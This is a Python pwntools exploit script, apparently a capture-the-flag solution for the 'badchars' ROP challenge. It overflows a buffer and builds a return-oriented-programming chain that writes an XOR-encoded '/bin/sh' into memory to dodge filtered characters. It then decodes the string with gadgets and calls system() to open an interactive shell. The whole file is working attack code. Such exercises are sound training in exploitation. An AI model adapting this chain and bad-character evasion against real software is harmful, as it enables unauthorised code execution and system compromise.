# -*- coding: utf-8 -*-
from pwn import *
p = process("./badchars")
elf = ELF("./badchars")
plt_puts = elf.plt["puts"]
# 0x0000000000400b39 : pop rdi ; ret
pop_rdi_ret = 0x0000000000400b39
call_system = 0x4009E8
bss_addr = 0x601080
# ROPgadget --binary ./badchars --only "|pop|mov|xor|ret"
# 0x0000000000400b3b : pop r12 ; pop r13 ; ret
# 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
# 0x0000000000400b40 : pop r14 ; pop r15 ; ret
# 0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
pop_r12_r13_ret = 0x0000000000400b3b
mov_r12_r13_ret = 0x0000000000400b34
pop_r14_r15_ret = 0x0000000000400b40
xor_r15_r14_ret = 0x0000000000400b30
bin_sh = "/bin/sh\x00"
xor_bin_sh = ""
for x in bin_sh:
	xor_bin_sh += chr(ord(x) ^ 3)
p.recvuntil("> ")
payload = 'a' * 40
# mov xor_bin_sh to bss_addr
payload += p64(pop_r12_r13_ret)
payload += xor_bin_sh
payload += p64(bss_addr)
payload += p64(mov_r12_r13_ret)
# xor bss_addr's with r14
for x in xrange(0, len(xor_bin_sh)):
	payload += p64(pop_r14_r15_ret)
	payload += p64(3)
	payload += p64(bss_addr + x)
	payload += p64(xor_r15_r14_ret)
# exec system("/bin/sh\x00")
payload += p64(pop_rdi_ret)
payload += p64(bss_addr)
payload += p64(call_system)
p.sendline(payload)
p.interactive()
